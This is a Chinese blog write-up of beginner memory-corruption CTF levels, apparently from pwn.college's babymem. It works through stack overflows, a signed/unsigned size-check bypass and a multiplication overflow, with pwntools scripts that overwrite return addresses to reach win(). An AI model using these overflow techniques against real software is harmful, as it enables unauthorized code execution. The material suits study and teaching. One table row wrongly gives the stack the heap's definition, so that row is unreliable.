punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>总结<br>在处理交互式程序时，需要谨慎处理输入输出的时机和顺序。确保程序的每一步输出都能被正确读取，并且在预期没有输出时避免阻塞。这可以通过合适的接收方法（如 recvline()、recvuntil()）、超时机制、非阻塞 I/O 或者分步处理的方式来实现。</li></ol><h3 id="2-Linux-命令"><a href="#2-Linux-命令" class="headerlink" title="2.  Linux 命令"></a>2.  Linux 命令</h3><p>发现了一个很好的网站。有各种常用命令的讲解和使用案例。</p><p><a href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html">https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html</a></p><h3 id="3-符号表"><a href="#3-符号表" class="headerlink" title="3. 符号表"></a>3. 符号表</h3><p>每个可重定位目标模块 m 都有一个符号表，它包含 m 定义和引用的符号的信息。在链接器的上下文中，有三种不同的符号：</p><ul><li>由模块 m 定义并能被其他模块引用的全局符号。全局链接器符号对应于非静态的 C 函数和全局变量。</li><li>由其他模块定义并被模块 m 引用的全局符号。这些符号称为外部符号，对应于在其他模块中定义的非静态 C 函数和全局变量。</li><li>只被模块 m 定义和引用的局部符号。它们对应于带 static 属性的 C 函数和全局变量。这些符号在模块 m 中任何位置都可见，但是不能被其他模块引用。</li></ul><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>data段</td><td>通常是指用来存放程序中已初始化的全局变量的一块内存区域。</td></tr><tr><td>bss段</td><td>通常是指用来存放程序中未初始化的全局变量的一块内存区域。bss是英文Block Started by Symbol的简称。</td></tr><tr><td>text段</td><td>存放程序执行代码的一块内存区域</td></tr><tr><td>堆</td><td>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</td></tr><tr><td>栈</td><td>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</td></tr></tbody></table><h3 id="4-canary保护机制"><a href="#4-canary保护机制" class="headerlink" title="4. canary保护机制"></a>4. canary保护机制</h3><p>典型栈金丝雀（<code>Stack Canary</code>）是一种保护机制，用于检测和防止栈溢出攻击。金丝雀值通常存储在 <code>fs 段寄存器</code>指向的内存区域中。典型的做法是将金丝雀值存储在<code> fs:[0x28]</code> 这样的固定偏移位置上，函数在进入和退出时会对该值进行检查。</p><p><code>fs 段寄存器</code>是 x86 和 x86-64 架构中的一个段寄存器，用于实现线程局部存储（Thread Local Storage, TLS）和其他与内存段相关的功能。在现代操作系统中，特别是在 64 位环境下，fs 段寄存器通常用于存储与线程和进程相关的重要数据结构，如线程控制块（Thread Control Block, TCB）和进程控制块（Process Control Block, PCB）。</p><p>栈金丝雀的值通常是随机的，操作系统在每次程序启动时会生成一个新的随机值，并将其存储在 <code>fs:28h</code>（或其他类似位置，具体取决于操作系统和编译器实现）处。</p><p><strong>在同一程序的生命周期内，如果没有特殊的重置或更改机制，fs:28h 的值通常保持不变。这意味着对于同一进程内的函数重复调用，栈金丝雀的值是一样的。</strong></p><p>还有一个特点，<code>canary</code>这个值的最低位通常是\x00开头的。栈金丝雀（canary）的最低位通常设置为 \x00，这是为了防止某些类型的缓冲区溢出攻击。这种设计有助于检测某些字符串复制函数（如 strcpy、strcat 等）未能正确处理缓冲区末尾的情况。这些函数通常会在遇到 \x00 时停止复制，因此在缓冲区溢出时，未能覆盖整个栈金丝雀的情况将更容易被检测到。</p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>第一关是个栈溢出的问题，理清楚栈结构就行。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-48h] BYREF</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-40h]</span>  _DWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-38h]</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h] BYREF</span>  __int64 v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-18h] BYREF</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> v6<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Send your payload (up to %lu bytes)!\n"</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> <span class="token function">__errno_location</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">strerror</span><span class="token punctuation">(</span><span class="token operator">*</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ERROR: Failed to read input -- %s!\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v5 <span class="token punctuation">)</span>    <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈结构，不知道为什么反汇编出来的<code>v5</code>是<code>v5= (_DWORD*)v7 + 1</code>。按照汇编语言来看的话<code>lea     rax, [rbp+var_30] \ add     rax, 1Ch \ mov     [rbp+var_38], rax</code>,应该是指向<code>0x1005C</code>大小为8个字节的数据。不知道为什么ida反编译的结果会跟v7联系起来。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">rsp\rbp --> 0x10000        --> 0x10008        --> 0x10010        --> 0x10018          --> 0x10020        --> 0x10028         --> 0x10030        --> 0x10038 v5        --> 0x10040 v6[0]  &lt;-----buf        --> 0x10048 v6[1]        --> 0x10050 v6[2]        --> 0x10058 v7[0]                        0x1005C  &lt;-----v5        --> 0x10060 v7[1]        --> 0x10068 v7[2]rbp ------- 0x10070  old rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的结果跟上述描述一致，当输入超过28个字节的时候，可以显示flag。当输入等于28个字节的时候，不能显示flag。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1<span class="token comment">###</span><span class="token comment">### Welcome to ./babymem_level1.1!</span><span class="token comment">###</span>Payload size: <span class="token number">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span>Send your payload <span class="token punctuation">(</span>up to <span class="token number">18446744073709551615</span> bytes<span class="token punctuation">)</span><span class="token operator">!</span>ERROR: Failed to <span class="token builtin class-name">read</span> input -- Bad address<span class="token operator">!</span>hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1<span class="token comment">###</span><span class="token comment">### Welcome to ./babymem_level1.1!</span><span class="token comment">###</span>Payload size: <span class="token number">28</span>Send your payload <span class="token punctuation">(</span>up to <span class="token number">28</span> bytes<span class="token punctuation">)</span><span class="token operator">!</span><span class="token number">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span>Goodbye<span class="token operator">!</span>hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1<span class="token comment">###</span><span class="token comment">### Welcome to ./babymem_level1.1!</span><span class="token comment">###</span>Payload size: <span class="token number">29</span>Send your payload <span class="token punctuation">(</span>up to <span class="token number">29</span> bytes<span class="token punctuation">)</span><span class="token operator">!</span><span class="token number">11111111111111111111111111111111111111111111111111111111111111111111111111111111</span>You win<span class="token operator">!</span> Here is your flag:  ERROR: Failed to <span class="token function">open</span> the flag -- Permission denied<span class="token operator">!</span>  Your effective user <span class="token function">id</span> is not <span class="token number">0</span><span class="token operator">!</span>  You must directly run the suid binary <span class="token keyword">in</span> order to have the correct permissions<span class="token operator">!</span>Goodbye<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>跟第一关的区别是，要把溢出的位置设置成某个十六进制数字<code>0x122925f0</code>。 关于变量反汇编又反汇编成<code>v5 = (_DWORD *)v7 + 1;</code>这样了，搜了一下，<code>_DWORD</code>是32位的，这样的话就对了，刚刚好是</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000001E81 48 8D 45 E0                   lea     rax, [rbp+var_20] &lt;----这里刚刚好是v6的地址.text:0000000000001E85 48 83 C0 14                   add     rax, 14h          &lt;----加20刚刚好是（int_32*）v7+1.text:0000000000001E89 48 89 45 D8                   mov     [rbp+var_28], rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">rsp\rbp --> 0x10000        --> 0x10008        --> 0x10010        --> 0x10018          --> 0x10020        --> 0x10028         --> 0x10030        --> 0x10038 v5        --> 0x10040 v6[0]  &lt;-----buf        --> 0x10048 v6[1]        --> 0x10050 v7[0]        --> 0x10058 v7[1]       ..............rbp ------- 0x10060  old rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-38h] BYREF</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h]</span>  _DWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-28h]</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-20h] BYREF</span>  __int64 v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-10h] BYREF</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> v6<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Send your payload (up to %lu bytes)!\n"</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> <span class="token function">__errno_location</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">strerror</span><span class="token punctuation">(</span><span class="token operator">*</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ERROR: Failed to read input -- %s!\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v5 <span class="token operator">==</span> <span class="token number">0x773E1A11</span> <span class="token punctuation">)</span>    <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><p>这一关是要将返回地址覆盖为win，3.0的程序是自带回显的。解释的已经很清楚了。</p><p>使用<code>objdump -t babymem_level3.0</code> 查询之后，win函数的地址是<code>0x0000000000401b15</code></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">###### Welcome to .&#x2F;babymem_level3.0!###The challenge() function has just been launched!Before we do anything, let&#39;s take a look at challenge()&#39;s stack frame:+---------------------------------+-------------------------+--------------------+|                  Stack location |            Data (bytes) |      Data (LE int) |+---------------------------------+-------------------------+--------------------+| 0x00007ffc285f1e50 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e58 (rsp+0x0008) | f8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2ff8 || 0x00007ffc285f1e60 (rsp+0x0010) | e8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2fe8 || 0x00007ffc285f1e68 (rsp+0x0018) | a0 c6 58 b0 01 00 00 00 | 0x00000001b058c6a0 || 0x00007ffc285f1e70 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e78 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1e98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1ea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1ea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 || 0x00007ffc285f1eb0 (rsp+0x0060) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 || 0x00007ffc285f1eb8 (rsp+0x0068) | 80 1e 5f 28 fc 7f 00 00 | 0x00007ffc285f1e80 || 0x00007ffc285f1ec0 (rsp+0x0070) | f0 2e 5f 28 fc 7f 00 00 | 0x00007ffc285f2ef0 || 0x00007ffc285f1ec8 (rsp+0x0078) | 41 22 40 00 00 00 00 00 | 0x0000000000402241 |+---------------------------------+-------------------------+--------------------+Our stack pointer points to 0x7ffc285f1e50, and our base pointer points to 0x7ffc285f1ec0.This means that we have (decimal) 16 8-byte words in our stack frame,including the saved base pointer and the saved return address, for atotal of 128 bytes.The input buffer begins at 0x7ffc285f1e80, partway through the stack frame,(&quot;above&quot; it in the stack are other local variables used by the function).Your input will be read into this buffer.The buffer is 46 bytes long, but the program will let you provide an arbitrarilylarge input length, and thus overflow the buffer.In this level, there is no &quot;win&quot; variable.You will need to force the program to execute the win() functionby directly overflowing into the stored return address back to main,which is stored at 0x7ffc285f1ec8, 72 bytes after the start of your input buffer.That means that you will need to input at least 80 bytes (46 to fill the buffer,26 to fill other stuff stored between the buffer and the return address,and 8 that will overwrite the return address).We have disabled the following standard memory corruption mitigations for this challenge:- the canary is disabled, otherwise you would corrupt it beforeoverwriting the return address, and the program would abort.- the binary is *not* position independent. This means that it will belocated at the same spot every time it is run, which means that byanalyzing the binary (using objdump or reading this output), you canknow the exact value that you need to overwrite the return address with.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h3><p>3.1 这关没有回显。<br>反汇编之后，发现我们需要覆盖0x60（覆盖距离rbp的数据区域） + 8 个字节的数据（覆盖rbp数据），然后才是ret返回地址。 也就是一共112个字节的数据。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">binary_data <span class="token operator">=</span> <span class="token string">b'\x61'</span><span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> <span class="token string">b'\x82\x14\x40\x00\x00\x00\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><p>相比之前的关卡，这一关在输入payloadsize之后，会增加一个校验。如果这个输入大于63字节的话，就会终止。是以有符号整数形式加载的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Provided size is too large!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在后续read函数读取的时候，<code>v9 = read(0, buf, LODWORD(nbytes[0]));</code>是以无符号整数的形式，调用的。所以我们可以传递一个负数，这样的话，就可以绕过检测。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/babymem_level4.0'</span><span class="token punctuation">)</span><span class="token comment"># 准备有效载荷</span>buffer_size <span class="token operator">=</span> <span class="token number">88</span>win_func_address <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4022cb</span><span class="token punctuation">)</span>  <span class="token comment"># 替换为实际地址</span><span class="token comment"># 发送整数下溢值绕过大小检查</span><span class="token comment"># p.sendlineafter("Payload size: ", "-1")</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span><span class="token comment"># 构造溢出并覆盖返回地址的有效载荷</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> buffer_sizepayload <span class="token operator">+=</span> win_func_address p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h3><p>以后要多用pwn编程，这样很快，不然后面的效率提不上来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level4.1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level4.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-2"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x70</span>padding_rbp_size <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># rbp</span>win_func_address <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401fd2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>buffer_size <span class="token operator">+</span> <span class="token string">b'B'</span><span class="token operator">*</span> padding_size <span class="token operator">+</span> win_func_addressp<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这一关在输入的地方，已经限制为无符号整数无法溢出。</p><p>但是在计算总大小的时候，两个32位的<code>usigned int</code>类型的整数相乘得到一个64位的整数。这个时候是可以溢出的。</p><h3 id="5-0"><a href="#5-0" class="headerlink" title="5.0"></a>5.0</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level5.1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level5.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"65536"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"65536"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x48</span>win_func_address <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4018a4</span><span class="token punctuation">)</span> <span class="token comment"># 地址查一下</span>payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> win_func_addressp<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这一关将校验的函数放在了win函数里，反而更方便了。因为覆盖返回的地址可以是任意地址，只需要跳过win函数的校验部分即可。</p><p>题目中说是要用objdump来分析，我直接用ida反汇编了。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000401C52 55                            push    rbp.text:0000000000401C53 48 89 E5                      mov     rbp, rsp.text:0000000000401C56 48 83 EC 10                   sub     rsp, 10h.text:0000000000401C5A 89 7D FC                      mov     [rbp+var_4], edi.text:0000000000401C5D 81 7D FC 37 13 00 00          cmp     [rbp+var_4], 1337h.text:0000000000401C64 0F 85 F2 00 00 00             jnz     loc_401D5C.text:0000000000401C64直接跳转到这里就可以了--&gt;.text:0000000000401C6A 48 8D 3D 7F 14 00 00          lea     rdi, aYouWinHereIsYo            ; &quot;You win! Here is your flag:&quot;.text:0000000000401C71 E8 AA F4 FF FF                call    _puts.text:0000000000401C71<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 